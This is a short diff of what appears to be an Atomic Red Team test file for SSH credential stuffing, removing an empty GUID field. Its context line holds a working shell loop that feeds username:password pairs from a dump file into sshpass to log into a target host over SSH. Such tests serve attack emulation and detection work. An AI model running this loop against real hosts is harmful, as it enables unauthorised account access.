@@ -64,7 +64,6 @@ atomic_tests:
       for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 
 - name: SSH Credential Stuffing From FreeBSD
-  auto_generated_guid: 
   description: |
     Using username,password combination from a password dump to login over SSH.
 
